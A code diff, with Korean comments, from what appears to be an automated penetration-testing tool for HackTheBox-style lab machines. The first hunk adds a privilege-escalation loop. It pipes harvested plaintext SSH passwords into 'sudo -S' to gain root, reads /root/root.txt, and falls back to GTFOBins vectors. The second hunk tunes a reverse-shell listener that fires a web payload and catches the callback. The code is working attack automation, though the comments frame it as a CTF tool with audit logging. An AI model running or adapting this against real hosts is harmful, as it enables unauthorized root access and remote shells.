@@ -125,26 +125,49 @@ class FootholdMixin:
         # ③ 폐루프 발사 (⚠️ 권한상승 실행 표면): 랭킹된 최상위 벡터의 상승 계획을 SSH 셸에서
         # 실행하고 uid=0 확인 → world 권한레벨 전이 → root 플래그. --exploit-exec 전용.
         if self.auto_poc and not self.world.has_access("root") and creds:
+            import shlex
+
             from .privesc_analyze import analyze_enum
-            corpus = "\n".join(f.output for f in report.enum_findings if f.output)
-            vectors = [v for v in analyze_enum(corpus) if v.confidence == "high" and v.plan]
-            user, pw = creds[0]
-            sh = SSHTargetShell(target, user, pw)
-            for v in vectors[:3]:
-                # v.plan 을 실행한 뒤 'id' 로 결과 확인 (한 줄로 묶어 실행)
+            # ③-a 자격 재사용(SSH): 평문 비번을 sudo -S(stdin)로 넣어 전체권한 sudo → root. su 와
+            # 달리 sshpass one-shot 에서도 동작하며, 매우 흔한 HTB 경로다(_privesc_loop 과 대칭).
+            for user, pw in creds[:3]:
+                if self.world.has_access("root") or self._goal_reached(report) or self._time_up():
+                    break
+                sh = SSHTargetShell(target, user, pw)
                 before = len(report.enum_findings)
                 self._attempt(report, report.enum_findings,
-                              sh.command(f"{v.plan.splitlines()[0]}; id"), phase="privesc")
-                # 이 명령의 '원본' finding 으로 확인한다 — 출력구동 교정이 발화하면 뒤에 교정본이
-                # append 돼 [-1] 이 교정본을 가리킬 수 있다(감사 LOW-3). 게이트 거부면 추가 없음.
+                              sh.command(f"echo {shlex.quote(pw)} | sudo -S -k -p '' id"),
+                              phase="privesc")
                 if len(report.enum_findings) <= before:
                     continue
-                last = report.enum_findings[before].output or ""
-                if "uid=0(root)" in last:
+                if "uid=0(root)" in (report.enum_findings[before].output or ""):
                     self.world.raise_access("root")
+                    self.audit.event("privesc_root", via="sudo-password-reuse", channel="ssh")
                     self._attempt(report, report.enum_findings,
-                                  sh.command("cat /root/root.txt 2>/dev/null"), phase="privesc")
+                                  sh.command(f"echo {shlex.quote(pw)} | sudo -S -k -p '' "
+                                             "cat /root/root.txt 2>/dev/null"), phase="privesc")
                     break
+            # ③-b GTFOBins 벡터 폐루프 — 위 자격 재사용으로 root 를 못 얻었을 때만.
+            if not self.world.has_access("root"):
+                corpus = "\n".join(f.output for f in report.enum_findings if f.output)
+                vectors = [v for v in analyze_enum(corpus) if v.confidence == "high" and v.plan]
+                user, pw = creds[0]
+                sh = SSHTargetShell(target, user, pw)
+                for v in vectors[:3]:
+                    # v.plan 을 실행한 뒤 'id' 로 결과 확인 (한 줄로 묶어 실행)
+                    before = len(report.enum_findings)
+                    self._attempt(report, report.enum_findings,
+                                  sh.command(f"{v.plan.splitlines()[0]}; id"), phase="privesc")
+                    # 이 명령의 '원본' finding 으로 확인한다 — 출력구동 교정이 발화하면 뒤에 교정본이
+                    # append 돼 [-1] 이 교정본을 가리킬 수 있다(감사 LOW-3). 게이트 거부면 추가 없음.
+                    if len(report.enum_findings) <= before:
+                        continue
+                    last = report.enum_findings[before].output or ""
+                    if "uid=0(root)" in last:
+                        self.world.raise_access("root")
+                        self._attempt(report, report.enum_findings,
+                                      sh.command("cat /root/root.txt 2>/dev/null"), phase="privesc")
+                        break
 
     def _foothold_stage(self, report, host) -> None:
         """발판 세션 확보 → 자격수확 → 플래그 수집. --exploit-exec 전용(RCE 실행 표면)."""
@@ -425,20 +448,29 @@ class FootholdMixin:
         import threading
         import time
         result: dict = {}
+        # 업그레이드 전용 '짧은' 수신 타임아웃 — 웹 발판은 이미 성립해 user 플래그를 쥐었으므로,
+        # 콜백이 안 오면 길게 기다리지 않고 웹 세션으로 복귀한다(기본 리버스셸 발판의 120s 와 구분).
+        to = getattr(self, "_revshell_upgrade_timeout", 25)
 
         def _listen():
             try:
-                result["sess"] = catch(lhost, int(lport))
+                # 실제 catcher 는 timeout 을 받는다(shell_transport.catch_reverse_shell). 주입된
+                # 2-인자 테스트 catcher 는 TypeError → timeout 없이 폴백(테스트 호환).
+                try:
+                    result["sess"] = catch(lhost, int(lport), timeout=to)
+                except TypeError:
+                    result["sess"] = catch(lhost, int(lport))
             except OSError as e:
                 result["err"] = e
 
         th = threading.Thread(target=_listen, daemon=True)
-        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport), via="web-upgrade")
+        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport), via="web-upgrade",
+                         timeout=to)
         th.start()
         # 리스너가 bind/accept 준비할 짧은 여유(테스트는 0). 그 뒤 트리거 발사.
         time.sleep(getattr(self, "_revshell_prefire_delay", 0.5))
         self._fire_web_payload(web_session, payload)
-        th.join(timeout=getattr(self, "_revshell_join_timeout", 125))
+        th.join(timeout=getattr(self, "_revshell_join_timeout", to + 5))
         session = result.get("sess")
         if session is None:
             return None
